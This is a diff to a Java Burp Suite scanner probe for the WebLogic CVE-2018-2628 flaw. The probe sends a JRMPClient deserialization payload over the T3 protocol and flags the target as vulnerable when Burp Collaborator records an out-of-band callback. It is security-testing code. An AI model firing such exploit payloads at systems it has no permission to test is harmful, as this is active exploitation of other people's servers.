@@ -1,9 +1,6 @@
 package probes;
 
-import burp.IHttpRequestResponse;
-import burp.IScanIssue;
-import burp.Utilities;
-import burp.WebLogicIssue;
+import burp.*;
 
 import java.io.IOException;
 import java.net.Socket;
@@ -18,21 +15,30 @@ public class CVE_2018_2628 extends Probe {
     @Override
     public IScanIssue check(IHttpRequestResponse requestResponse) {
         URL target = Utilities.helpers.analyzeRequest(requestResponse).getUrl();
-        Pattern p = Pattern.compile("\\$Proxy[0-9]+");
+        String pollPayload = Utilities.collaborator.generatePayload(true);
+        boolean vulnerable = false;
         String result = "";
         try {
             Socket s = new Socket(target.getHost(), target.getPort());
             s.setSoTimeout(10);
 
-            result = sendT3Payload(s, payloads.get("Activator"));
+            result = sendT3Payload(s, JRMPClient.getPayloadBytes(pollPayload, "activator"));
             s.close();
-        } catch (IOException e) {
+        } catch (Exception e) {
             e.printStackTrace();
         }
 
+        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
+            detail = detail + "<br/>"
+                    + "Receive a " + interaction.getProperty("type")
+                    + " query from " + interaction.getProperty("client_ip")
+                    + " at " + interaction.getProperty("time_stamp");
+
+            vulnerable = true;
+        }
+
 //        return result.contains("weblogic.jms.common.StreamMessageImpl") ? new WebLogicIssue(requestResponse, NAME, DETAIL, SEVERITY) : null;
-        if (p.matcher(result).find()) {
-            detail = detail + "<br/><br/>" + result;
+        if (vulnerable) {
             return new WebLogicIssue(requestResponse, NAME, detail, SEVERITY);
         } else return null;
     }
